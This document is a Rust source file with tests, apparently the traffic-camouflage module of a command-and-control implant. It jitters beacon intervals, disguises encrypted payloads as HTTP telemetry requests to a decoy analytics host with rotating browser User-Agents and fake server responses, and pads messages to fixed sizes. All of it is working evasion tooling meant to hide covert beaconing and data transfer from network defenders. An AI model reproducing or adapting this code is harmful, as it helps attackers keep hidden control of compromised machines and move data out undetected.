use hmac::{Hmac, Mac};
use rand::Rng;
use sha2::Sha256;
use log::debug;

type HmacSha256 = Hmac<Sha256>;

// ============ Beacon Jitter ============

pub struct BeaconJitter {
    base_interval: u64,
    jitter_ratio: f64,
    seed: [u8; 32],
    tick: u64,
}

impl BeaconJitter {
    pub fn new(base_interval: u64, jitter_ratio: f64, seed: &[u8; 32]) -> Self {
        Self {
            base_interval,
            jitter_ratio: jitter_ratio.clamp(0.0, 0.9),
            seed: *seed,
            tick: 0,
        }
    }

    pub fn next_interval(&mut self) -> u64 {
        let max_jitter = (self.base_interval as f64 * self.jitter_ratio) as u64;
        if max_jitter == 0 {
            return self.base_interval;
        }

        let mut mac = <HmacSha256 as Mac>::new_from_slice(&self.seed)
            .expect("HMAC accepts any key size");
        mac.update(&self.tick.to_be_bytes());
        mac.update(b"beacon-jitter");
        let hash = mac.finalize().into_bytes();

        let jitter_val = u64::from_be_bytes(hash[..8].try_into().unwrap()) % (max_jitter * 2 + 1);
        let interval = self.base_interval - max_jitter + jitter_val;

        self.tick += 1;
        debug!("Beacon jitter: base={}s, actual={}s", self.base_interval, interval);
        interval.max(1)
    }
}

// ============ HTTP Mimicry ============

pub struct HttpMimicry {
    seed: [u8; 32],
    request_index: u64,
}

const USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
];

const ACCEPT_HEADERS: &[&str] = &[
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "application/json, text/plain, */*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "*/*",
];

const URL_PATHS: &[&str] = &[
    "/api/v2/telemetry/collect",
    "/api/v1/analytics/events",
    "/cdn/assets/config.json",
    "/api/health/check",
    "/v3/notifications/poll",
    "/api/v2/sync/status",
    "/static/js/app.bundle.js",
    "/api/metrics/report",
];

const CONTENT_TYPES: &[&str] = &[
    "application/json; charset=utf-8",
    "application/x-www-form-urlencoded",
    "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk",
    "application/octet-stream",
];

impl HttpMimicry {
    pub fn new(seed: &[u8; 32]) -> Self {
        Self {
            seed: *seed,
            request_index: 0,
        }
    }

    fn pick_from<'a>(&self, list: &[&'a str], context: &[u8]) -> &'a str {
        let mut mac = <HmacSha256 as Mac>::new_from_slice(&self.seed)
            .expect("HMAC accepts any key size");
        mac.update(&self.request_index.to_be_bytes());
        mac.update(context);
        let hash = mac.finalize().into_bytes();
        let idx = hash[0] as usize % list.len();
        list[idx]
    }

    pub fn wrap_as_http_request(&mut self, payload: &[u8]) -> Vec<u8> {
        let ua = self.pick_from(USER_AGENTS, b"ua");
        let accept = self.pick_from(ACCEPT_HEADERS, b"accept");
        let path = self.pick_from(URL_PATHS, b"path");
        let content_type = self.pick_from(CONTENT_TYPES, b"ct");

        let body = base64::encode(payload);

        let mut rng = rand::thread_rng();
        let method = if rng.gen_bool(0.5) { "POST" } else { "PUT" };

        let request = format!(
            "{} {} HTTP/1.1\r\n\
             Host: telemetry.cdn-analytics.com\r\n\
             User-Agent: {}\r\n\
             Accept: {}\r\n\
             Content-Type: {}\r\n\
             Content-Length: {}\r\n\
             Connection: keep-alive\r\n\
             X-Request-ID: {}\r\n\
             X-Correlation-ID: {}\r\n\
             Cache-Control: no-cache\r\n\
             \r\n\
             {}",
            method,
            path,
            ua,
            accept,
            content_type,
            body.len(),
            uuid::Uuid::new_v4(),
            uuid::Uuid::new_v4(),
            body,
        );

        self.request_index += 1;
        debug!("HTTP mimicry: {} {} (UA rotation #{})", method, path, self.request_index);
        request.into_bytes()
    }

    pub fn extract_from_http_request(raw: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        let text = std::str::from_utf8(raw)?;
        let body_start = text.find("\r\n\r\n")
            .ok_or("No HTTP body separator found")?;
        let body = text[body_start + 4..].trim();
        let decoded = base64::decode(body)?;
        Ok(decoded)
    }

    pub fn wrap_as_http_response(&mut self, payload: &[u8]) -> Vec<u8> {
        let content_type = self.pick_from(CONTENT_TYPES, b"resp-ct");
        let body = base64::encode(payload);

        let response = format!(
            "HTTP/1.1 200 OK\r\n\
             Content-Type: {}\r\n\
             Content-Length: {}\r\n\
             Server: nginx/1.24.0\r\n\
             X-Powered-By: Express\r\n\
             X-Request-ID: {}\r\n\
             Cache-Control: private, no-store\r\n\
             \r\n\
             {}",
            content_type,
            body.len(),
            uuid::Uuid::new_v4(),
            body,
        );

        self.request_index += 1;
        response.into_bytes()
    }

    pub fn extract_from_http_response(raw: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        Self::extract_from_http_request(raw)
    }
}

// ============ Size Normalizer ============

pub struct SizeNormalizer {
    target_sizes: Vec<usize>,
}

impl SizeNormalizer {
    pub fn new() -> Self {
        Self {
            target_sizes: vec![256, 512, 1024, 2048, 4096, 8192],
        }
    }

    pub fn normalize(&self, data: &[u8]) -> Vec<u8> {
        let data_len = data.len();

        let target = self.target_sizes
            .iter()
            .find(|&&s| s >= data_len + 4) // 4 bytes for original length header
            .copied()
            .unwrap_or(data_len + 4 + 256); // fallback: pad to next 256 boundary

        let target = if target == data_len + 4 + 256 {
            ((data_len + 4 + 255) / 256) * 256 + 256
        } else {
            target
        };

        let mut result = Vec::with_capacity(target);

        // Header: original data length (4 bytes big-endian)
        result.extend_from_slice(&(data_len as u32).to_be_bytes());
        result.extend_from_slice(data);

        // Pad with random bytes
        let pad_len = target - result.len();
        if pad_len > 0 {
            let mut rng = rand::thread_rng();
            let padding: Vec<u8> = (0..pad_len).map(|_| rng.gen()).collect();
            result.extend_from_slice(&padding);
        }

        debug!("Size normalized: {} -> {} bytes (target bucket: {})", data_len, result.len(), target);
        result
    }

    pub fn denormalize(data: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        if data.len() < 4 {
            return Err("Normalized data too short".into());
        }

        let original_len = u32::from_be_bytes(data[..4].try_into()?) as usize;
        if original_len + 4 > data.len() {
            return Err("Invalid original length in normalized data".into());
        }

        Ok(data[4..4 + original_len].to_vec())
    }
}

// ============ Traffic Profile ============

#[derive(Clone, Debug)]
pub enum CamouflageMode {
    None,
    HttpMimicry,
    SizeOnly,
    Full,
}

pub struct TrafficProfile {
    pub mode: CamouflageMode,
    pub jitter: BeaconJitter,
    pub http: HttpMimicry,
    pub normalizer: SizeNormalizer,
}

impl TrafficProfile {
    pub fn new(mode: CamouflageMode, base_interval: u64, seed: &[u8; 32]) -> Self {
        let mut jitter_seed = [0u8; 32];
        let mut http_seed = [0u8; 32];

        let mut mac = <HmacSha256 as Mac>::new_from_slice(seed)
            .expect("HMAC accepts any key size");
        mac.update(b"jitter-seed");
        jitter_seed.copy_from_slice(&mac.finalize().into_bytes());

        let mut mac = <HmacSha256 as Mac>::new_from_slice(seed)
            .expect("HMAC accepts any key size");
        mac.update(b"http-seed");
        http_seed.copy_from_slice(&mac.finalize().into_bytes());

        Self {
            mode,
            jitter: BeaconJitter::new(base_interval, 0.33, &jitter_seed),
            http: HttpMimicry::new(&http_seed),
            normalizer: SizeNormalizer::new(),
        }
    }

    pub fn next_beacon_interval(&mut self) -> u64 {
        self.jitter.next_interval()
    }

    pub fn wrap_outbound(&mut self, encrypted_data: &[u8]) -> Vec<u8> {
        match self.mode {
            CamouflageMode::None => encrypted_data.to_vec(),
            CamouflageMode::SizeOnly => {
                self.normalizer.normalize(encrypted_data)
            }
            CamouflageMode::HttpMimicry => {
                self.http.wrap_as_http_request(encrypted_data)
            }
            CamouflageMode::Full => {
                let normalized = self.normalizer.normalize(encrypted_data);
                self.http.wrap_as_http_request(&normalized)
            }
        }
    }

    pub fn unwrap_inbound(&mut self, wire_data: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        match self.mode {
            CamouflageMode::None => Ok(wire_data.to_vec()),
            CamouflageMode::SizeOnly => {
                SizeNormalizer::denormalize(wire_data)
            }
            CamouflageMode::HttpMimicry => {
                HttpMimicry::extract_from_http_response(wire_data)
            }
            CamouflageMode::Full => {
                let extracted = HttpMimicry::extract_from_http_response(wire_data)?;
                SizeNormalizer::denormalize(&extracted)
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_jitter_varies_interval() {
        let seed = [42u8; 32];
        let mut jitter = BeaconJitter::new(30, 0.33, &seed);

        let mut intervals = Vec::new();
        for _ in 0..10 {
            intervals.push(jitter.next_interval());
        }

        // All intervals should be within ±33% of base
        for &i in &intervals {
            assert!(i >= 20, "interval {} too low", i);
            assert!(i <= 40, "interval {} too high", i);
        }

        // Should not all be the same
        let unique: std::collections::HashSet<_> = intervals.iter().collect();
        assert!(unique.len() > 1, "All intervals identical: {:?}", intervals);
    }

    #[test]
    fn test_http_mimicry_wrap_unwrap() {
        let seed = [42u8; 32];
        let mut mimicry = HttpMimicry::new(&seed);

        let payload = b"encrypted-data-here-12345";
        let wrapped = mimicry.wrap_as_http_request(payload);
        let wrapped_str = String::from_utf8_lossy(&wrapped);

        assert!(wrapped_str.contains("HTTP/1.1"));
        assert!(wrapped_str.contains("User-Agent:"));
        assert!(wrapped_str.contains("Content-Type:"));
        assert!(!wrapped_str.contains("encrypted-data-here"));

        let extracted = HttpMimicry::extract_from_http_request(&wrapped).unwrap();
        assert_eq!(payload.to_vec(), extracted);
    }

    #[test]
    fn test_http_mimicry_varies_headers() {
        let seed = [42u8; 32];
        let mut mimicry = HttpMimicry::new(&seed);

        let payload = b"test";
        let r1 = String::from_utf8_lossy(&mimicry.wrap_as_http_request(payload)).to_string();
        let r2 = String::from_utf8_lossy(&mimicry.wrap_as_http_request(payload)).to_string();

        // X-Request-ID is always unique (UUID)
        assert_ne!(r1, r2);
    }

    #[test]
    fn test_size_normalizer() {
        let normalizer = SizeNormalizer::new();

        // Small payload should be padded to 256
        let small = vec![1u8; 100];
        let normalized = normalizer.normalize(&small);
        assert_eq!(normalized.len(), 256);

        let denormalized = SizeNormalizer::denormalize(&normalized).unwrap();
        assert_eq!(small, denormalized);
    }

    #[test]
    fn test_size_normalizer_buckets() {
        let normalizer = SizeNormalizer::new();

        let sizes_and_expected: Vec<(usize, usize)> = vec![
            (100, 256),
            (300, 512),
            (600, 1024),
            (1500, 2048),
            (3000, 4096),
            (5000, 8192),
        ];

        for (input_size, expected_bucket) in sizes_and_expected {
            let data = vec![0xAB; input_size];
            let normalized = normalizer.normalize(&data);
            assert_eq!(normalized.len(), expected_bucket,
                "Input {} should normalize to {}, got {}", input_size, expected_bucket, normalized.len());

            let restored = SizeNormalizer::denormalize(&normalized).unwrap();
            assert_eq!(data, restored);
        }
    }

    #[test]
    fn test_traffic_profile_full_roundtrip() {
        let seed = [42u8; 32];
        let mut sender = TrafficProfile::new(CamouflageMode::Full, 30, &seed);
        let mut receiver = TrafficProfile::new(CamouflageMode::Full, 30, &seed);

        let original = b"super-secret-encrypted-payload";
        let wire = sender.wrap_outbound(original);

        // Wire data looks like HTTP
        let wire_str = String::from_utf8_lossy(&wire);
        assert!(wire_str.contains("HTTP/1.1"));
        assert!(!wire_str.contains("super-secret"));

        let restored = receiver.unwrap_inbound(&wire).unwrap();
        assert_eq!(original.to_vec(), restored);
    }

    #[test]
    fn test_traffic_profile_size_only() {
        let seed = [42u8; 32];
        let mut profile = TrafficProfile::new(CamouflageMode::SizeOnly, 30, &seed);

        let data = vec![0x42; 100];
        let wrapped = profile.wrap_outbound(&data);
        assert_eq!(wrapped.len(), 256);

        let unwrapped = profile.unwrap_inbound(&wrapped).unwrap();
        assert_eq!(data, unwrapped);
    }

    #[test]
    fn test_same_payload_different_wire_data() {
        let seed = [42u8; 32];
        let mut profile = TrafficProfile::new(CamouflageMode::Full, 30, &seed);

        let payload = b"same-data";
        let w1 = profile.wrap_outbound(payload);
        let w2 = profile.wrap_outbound(payload);

        // UUIDs and potentially random padding differ each time
        assert_ne!(w1, w2);
    }
}
